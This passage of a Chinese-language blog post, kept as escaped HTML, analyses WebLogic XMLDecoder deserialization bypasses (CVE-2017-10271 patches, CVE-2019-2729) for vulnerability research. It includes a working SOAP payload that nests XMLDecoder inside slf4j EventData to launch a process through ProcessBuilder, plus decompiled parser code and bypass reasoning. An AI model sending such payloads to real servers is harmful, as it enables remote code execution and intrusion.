&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">EventException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Error decoding &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">xml&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">var4&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>看这个类的构造方法，直接将传入的xml交给XMLDecoder.readObject了，简单粗暴，再加上本身的一层XMLDecoder，我们的payload需要被两次XMLDecode解析，所以将第二次的解析内容放入&lt;code>&amp;lt;![CDATA]&amp;gt;&lt;/code>中，第二次的XMLDecoder不经过黑名单，无jdk版本限制，所以可以用2017-3506的payload&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-xml" data-lang="xml">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;soapenv:Envelope&lt;/span> &lt;span style="color:#75af00">xmlns:soapenv=&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://schemas.xmlsoap.org/soap/envelope/&amp;#34;&lt;/span> &lt;span style="color:#75af00">xmlns:wsa=&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://www.w3.org/2005/08/addressing&amp;#34;&lt;/span> &lt;span style="color:#75af00">xmlns:asy=&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://www.bea.com/async/AsyncResponseService&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#f92672">&amp;lt;soapenv:Header&amp;gt;&lt;/span> &lt;span style="color:#f92672">&amp;lt;wsa:Action&amp;gt;&lt;/span>xx&lt;span style="color:#f92672">&amp;lt;/wsa:Action&amp;gt;&amp;lt;wsa:RelatesTo&amp;gt;&lt;/span>xx&lt;span style="color:#f92672">&amp;lt;/wsa:RelatesTo&amp;gt;&lt;/span> &lt;span style="color:#f92672">&amp;lt;work:WorkContext&lt;/span> &lt;span style="color:#75af00">xmlns:work=&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://bea.com/2004/06/soap/workarea/&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;java&amp;gt;&amp;lt;class&amp;gt;&amp;lt;string&amp;gt;&lt;/span>org.slf4j.ext.EventData&lt;span style="color:#f92672">&amp;lt;/string&amp;gt;&amp;lt;void&amp;gt;&amp;lt;string&amp;gt;&lt;/span>&lt;span style="color:#75715e">&amp;lt;![CDATA[&amp;lt;java version=&amp;#34;1.8.0_131&amp;#34; class=&amp;#34;java.beans.XMLDecoder&amp;#34;&amp;gt;&amp;lt;object class=&amp;#34;java.lang.ProcessBuilder&amp;#34;&amp;gt;&amp;lt;array class=&amp;#34;java.lang.String&amp;#34; length=&amp;#34;1&amp;#34;&amp;gt;&amp;lt;void index=&amp;#34;0&amp;#34;&amp;gt;&amp;lt;string&amp;gt;calc&amp;lt;/string&amp;gt;&amp;lt;/void&amp;gt;&amp;lt;/array&amp;gt;&amp;lt;void method=&amp;#34;start&amp;#34; /&amp;gt;&amp;lt;/object&amp;gt;&amp;lt;/java&amp;gt;]]&amp;gt;&lt;/span>&lt;span style="color:#f92672">&amp;lt;/string&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;/void&amp;gt;&amp;lt;/class&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;/java&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/work:WorkContext&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/soapenv:Header&amp;gt;&lt;/span> &lt;span style="color:#f92672">&amp;lt;soapenv:Body&amp;gt;&amp;lt;asy:onAsyncDelivery/&amp;gt;&amp;lt;/soapenv:Body&amp;gt;&amp;lt;/soapenv:Envelope&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="fix-2">fix&lt;/h3>
&lt;p>依旧黑名单，禁止了class, object, new, method标签，同时对void和array标签做了很多限制&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221017101636246.png" alt="image-20221017101636246">&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221017101652359.png" alt="image-20221017101652359">&lt;/p>
&lt;p>void标签只能存在index属性，array标签的length也做了限制&lt;/p>
&lt;h2 id="cve-2019-2729">CVE-2019-2729&lt;/h2>
&lt;p>针对CVE-2017-10271在java6上的特殊绕过&lt;/p>
&lt;h3 id="过程分析-2">过程分析&lt;/h3>
&lt;p>对于XMLDecoder之前的部分已经被挖掘的差不多了，我们考虑往XMLDecoder之后找找利用点；前面也提过apache xerces，它最终内部使用SAXParser处理标签&lt;/p>
&lt;p>在SAXParser这个三级标题中，起到主要作用的ContentHandler在java6中变为了ObjectHandler&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221017151221508.png" alt="image-20221017151221508">&lt;/p>
&lt;p>在XMLDecoder.readObject之后的调用栈如下&lt;/p>
&lt;pre tabindex="0">&lt;code>startElement:181, ObjectHandler (com.sun.beans)
startElement:453, AbstractSAXParser (com.sun.org.apache.xerces.internal.parsers)
startElement:767, XMLDTDValidator (com.sun.org.apache.xerces.internal.impl.dtd)
scanStartElement:1363, XMLDocumentFragmentScannerImpl (com.sun.org.apache.xerces.internal.impl)
scanRootElementHook:1318, XMLDocumentScannerImpl$ContentDriver (com.sun.org.apache.xerces.internal.impl)
next:3103, XMLDocumentFragmentScannerImpl$FragmentContentDriver (com.sun.org.apache.xerces.internal.impl)
next:922, XMLDocumentScannerImpl$PrologDriver (com.sun.org.apache.xerces.internal.impl)
next:648, XMLDocumentScannerImpl (com.sun.org.apache.xerces.internal.impl)
scanDocument:511, XMLDocumentFragmentScannerImpl (com.sun.org.apache.xerces.internal.impl)
parse:808, XML11Configuration (com.sun.org.apache.xerces.internal.parsers)
parse:737, XML11Configuration (com.sun.org.apache.xerces.internal.parsers)
parse:119, XMLParser (com.sun.org.apache.xerces.internal.parsers)
parse:1205, AbstractSAXParser (com.sun.org.apache.xerces.internal.parsers)
parse:522, SAXParserImpl$JAXPSAXParser (com.sun.org.apache.xerces.internal.jaxp)
parse:69, WebLogicParser (weblogic.xml.jaxp)
parse:156, RegistryParser (weblogic.xml.jaxp)
parse:364, SAXParser (javax.xml.parsers)
parse:142, SAXParser (javax.xml.parsers)
getHandler:238, XMLDecoder (java.beans)
readObject:201, XMLDecoder (java.beans)
readUTF:111, WorkContextXmlInputAdapter (weblogic.wsee.workarea)
// omit
&lt;/code>&lt;/pre>&lt;p>进入startElement之后又和前面的java7有很大区别&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221017151611315.png" alt="image-20221017151611315">&lt;/p>
&lt;p>下面这个是java7的，startElement在DocumentHandler中&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221017151637676.png" alt="image-20221017151637676">&lt;/p>
&lt;p>在java6中，解析到一个标签时会首先根据当前标签生成一个MutableExpression类，后续的setXXX, getXXX之类的操作都在这个类的实例上进行，遇到标签闭合处会执行endElement函数，调用Expression#getValue计算值，我们跟入getValue&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221017153433603.png" alt="image-20221017153433603">&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221017153502895.png" alt="image-20221017153502895">&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221017153514356.png" alt="image-20221017153514356">&lt;/p>
&lt;p>unbound是MutableExpression对象的属性之一，初始this.value==unbound，如果还是初始状态则调用setValue(invoke())，跟入Statement#invokeInternal&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221017154141883.png" alt="image-20221017154141883">&lt;/p>
&lt;p>这里的一个return很明显是在进行反射调用，而target正是从MutableExpression#getTarget中获得，methodName正式从MutableExpression#getMethodName中获得&lt;/p>
&lt;p>梳理一下前面的调用，ObjectHandker#startElement（也就是java7中的DocumentHandelr#startElement）会根据当前的标签信息生成一个MutableExpression对象，标签结束时执行这个Expression，执行时会根据当前Expression对象属性中的target和mathodName来确定反射调用的类和执行的函数&lt;/p>
&lt;p>回到ObejctHandler#startElement，看看有哪些标签是可用的&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;string&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setTarget&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setMethodName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;new&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isString&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isPrimitive&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">wrapper&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">typeNameToClass&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setTarget&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">wrapper&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setMethodName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;new&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">parseCharCode&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">attributes&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;class&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setTarget&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setMethodName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;forName&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;null&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setTarget&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setMethodName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;getSuperclass&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setValue&lt;/span>&lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;void&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getTarget&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setTarget&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">eval&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;array&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">subtypeName&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">attributes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;class&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">subtype&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">subtypeName&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span> &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">classForName2&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">subtypeName&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">length&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">attributes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;length&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">length&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setTarget&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Array&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">addArg&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">subtype&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">addArg&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">length&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">arrayClass&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Array&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">subtype&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setTarget&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">arrayClass&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;java&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">is&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#d88200">&amp;#34;object&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">simulateException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Unrecognized opening tag: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34; &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">attrsToString&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">attrs&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>比java7少了一个new标签，同时在此处java, null标签都会经过setValue的处理，后续即使再更改内容都不会再次setValue(invoke())了（判断标准是是否this.value==unbound），排除这些就只剩下一些基础类型的标签了，但它们也都有setTarget和setMethodName的操作，我们无法干预；那能否对已经赋值的内容进行覆盖呢？&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221017155224578.png" alt="image-20221017155224578">&lt;/p>
&lt;p>再仔细看startElement的处理逻辑，在进入具体的标签处理之前提前对MutableExpression对象调用setTarget和setMethodName对象，假如我们发送这样的内容&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-xml" data-lang="xml">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;string&lt;/span> &lt;span style="color:#75af00">class=&lt;/span>&lt;span style="color:#d88200">&amp;#34;test&amp;#34;&lt;/span> &lt;span style="color:#75af00">method=&lt;/span>&lt;span style="color:#d88200">&amp;#34;abc&amp;#34;&lt;/span>&lt;span style="color:#f92672">/&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>苦露西，到下面执行string标签时就会被setTarget和setMethodName覆盖，这条路堵死了&lt;/p>
&lt;p>再往后看startElement&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221017161828137.png" alt="image-20221017161828137">&lt;/p>
&lt;p>这是在标签处理之后，再对其中的属性进行进一步解析，id存入 idref取出，lookup函数中顺带又执行了一次Expression（通过getValue）&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221017162144385.png" alt="image-20221017162144385">&lt;/p>
&lt;p>回到statElement，在处理field属性时，连续调用了getTarget, getFieldValue, setValue，根据上面的分析，java和object标签是不会被setValue(invoke())覆盖的，跟入getFieldValue，发现这就是正常反射的getField过程&lt;/p>
&lt;p>此时有两个思路：&lt;/p>
&lt;ol>
&lt;li>如果使用java标签指定class（即target），也就是对指定Class进行属性值获取，只能获得static修饰的属性，同时由于FieldUtil#getField调用的是Class#getField获取的Field对象，所以只能获得到public修饰的，也就是只能获得public static修饰的属性，没什么实用性&lt;/li>
&lt;li>能否从public static修饰的属性中偷一个Object对象，利用id和idref的存取特性，对java标签的setValue进行覆盖，即重新给一个Object对象（this.value==unbound判断中unbound就是一个Object对象），让它进入if判断，触发setValue(invoke())？也是不行的，因为重新给的Object也和最初的unbound不同&lt;/li>
&lt;/ol>
&lt;p>还有什么方式呢？我们考虑把类和函数这两个rce的核心内容拆开来看，就像CVE-2019-2725中那样在class标签中指定类，在构造函数中完成利用；从上文对startElement的分析可知，如果methodName为空则指定为new，在后续反射调用中就会代指newInstance函数&lt;/p>
&lt;p>在对标签名解析的过程中，基本都调用了setTarget&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221017170026462.png" alt="image-20221017170026462">&lt;/p>
&lt;p>特殊的void非常显眼，虽然前面的补丁里让void中只能由index属性，但可以用eval函数的返回结果当Target&lt;/p>
&lt;p>补丁中对array标签提取了class和length属性进行限制，但对应methodName的method属性没有被检测（有了任意函数），虽然array标签在解析中target是被指定的（Byte.class或Class.class），但问题不大，在最终的Statement#invokeInternal中能正确解析&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221017174557960.png" alt="image-20221017174557960">&lt;/p>
&lt;p>传入&lt;code>&amp;lt;array method=&amp;quot;getMethods&amp;quot;&lt;/code>，method不等于预设的if中任意一种，而且target也不是Class.class，进入上图中最后一个if(m==null)，满足我们的要求&lt;/p>
&lt;hr>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
以下是本文中涉及到的 和我学习时看过的所有文章的链接🔗 每日感谢互联网的丰富资源（
&lt;/h4>
&lt;/summary>
